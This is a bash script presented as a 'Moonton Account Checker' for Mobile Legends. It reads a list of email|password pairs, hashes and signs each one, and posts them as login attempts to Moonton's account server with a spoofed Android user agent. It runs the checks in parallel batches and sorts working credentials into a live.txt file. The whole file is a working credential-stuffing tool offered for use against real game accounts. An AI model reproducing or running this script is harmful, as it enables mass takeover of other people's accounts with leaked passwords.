#!/bin/bash

clear
echo -e "\e[92m"
cat << "EOF"
            ######                           #####        
            ######                           #####        
            ######                           #####        
            ##########                  ##########        
                ######                  ######            
                ######                  ######            
                ######                  ######            
            ######################################        
            ######################################        
            ######################################        
        ##############################################    
        ##########   ####################    #########    
        ##########   ####################    #########    
    ######################################################
    ######################################################
    ######################################################
    ######################################################
    #####   ######################################   #####
    #####   ######################################   #####
    #####   ######################################   #####
    #####   ######                           #####   #####
    #####   ######                           #####   #####
    #####   ######                           #####   #####
    #####   ##################   #################   #####
                ##############   #############            
                ##############   #############            
                ##############   #############
EOF
echo -e "\e[0m"
cat << "EOF"
    ------------------------------------------------------
      Moonton Account Checker (Mobile Legends)
      Code By Cyber Screamer | CyberScreamer@bc0de.net
      Thank\'s To Lestravo Mahasiswa Tersakiti & Sikuder
    ------------------------------------------------------

EOF

function ngecek(){
	local CY='\e[36m'
	local GR='\e[34m'
	local OG='\e[92m'
	local WH='\e[37m'
	local RD='\e[31m'
	local YL='\e[33m'
	local BF='\e[34m'
	local DF='\e[39m'
	local OR='\e[33m'
	local PP='\e[35m'
	local B='\e[1m'
	local CC='\e[0m'
  local empas="${BF}${1}/${2}${CC}"
  local stats="${PP}[$(date +"%T")]${CC} (${3}/${4})"
	local md5pwd=$(echo -n ${2} | md5sum | awk '{ print $1 }')
	local sign=$(echo -n "account="${1}"&md5pwd="${md5pwd}"&op=login" | md5sum | awk '{ print $1 }')
	local postdata="{\"op\":\"login\",\"sign\":\"${sign}\",\"params\":{\"account\":\"${1}\",\"md5pwd\":\"${md5pwd}\"},\"lang\":\"en\"}"
	local result=$(curl -s "http://accountgm.moonton.com:37001" \
	-A "Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X Build/N2G47H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.98 Mobile Safari/537.36" \
	-H "X-Requested-With: com.mobile.legends" \
	-d "${postdata}")
	local STATUS=$(echo $result | grep -Po "(?<=message\":\")[^\"]*")
	local SESSION=$(echo $result | grep -Po "(?<=session\":\")[^\"]*")
	local CODE=$(echo $result | grep -Po "(?<=code\":)[^,]*")
	if [[ $STATUS =~ "Error_Success" ]]; then
		printf "${stats} ${empas} => [${OG}${B}LIVE${CC}] STATUS: ${OG}${STATUS}${CC} | SESSION: ${OG}${SESSION}${CC} | CODE: ${OG}${CODE}${CC}\n"
		echo "${1}|${2}" >> live.txt
	elif [[ $STATUS =~ "Error_PasswdError" || $STATUS =~ "Error_NoAccount" ]]; then
		printf "${stats} ${empas} => [${RD}${B}DIE${CC}] STATUS: ${OR}${STATUS}]${CC} | CODE: ${OR}${CODE}${CC}\n"
		echo "${1}|${2}" >> die.txt
	else
		printf "${stats} ${empas} => [${CY}${B}UNK${CC}] STATUS: ${CY}${STATUS}${CC} | CODE: ${CY}${CODE}${CC}\n"
		echo "${1}|${2}" >> unk.txt
	fi
}

# CHECK SPECIAL VAR FOR MAILIST
if [[ -z $1 ]]; then
	printf "To Use $0 <mailist.txt> \n"
	exit 1
fi

totallines=$(wc -l < ${1});
itung=1

# RATIO
persend=20
setleep=2

printf "  ===============================\n"
printf "  [!] Filename: ${1}\n"
printf "  [!] Total Lines: ${totallines}\n"
printf "  [!] Ratio: ${persend} \ ${setleep} Seconds\n"
printf "  ===============================\n\n"

IFS=$'\r\n' GLOBIGNORE='*' command eval 'mailist=($(cat $1))'

for (( i = 0; i < ${#mailist[@]}; i++ )); do
  index=$((itung++))
	username="${mailist[$i]}"
	IFS='|' read -r -a array <<< "$username"
	email=${array[0]}
	password=${array[1]}
  if [[ $(expr ${i} % ${persend}) == 0 && $i > 0 ]]; then
    percentage=$((100*$i/$totallines))
   	wait
  	printf "   >> \e[1;33mSleep for ${setleep}s Total Checked: ${i}(${percentage}%%) - BC0DE.NET\n"
    sleep $setleep
   fi

    ngecek "${email}" "${password}" "${index}" "${totallines}" &
done
wait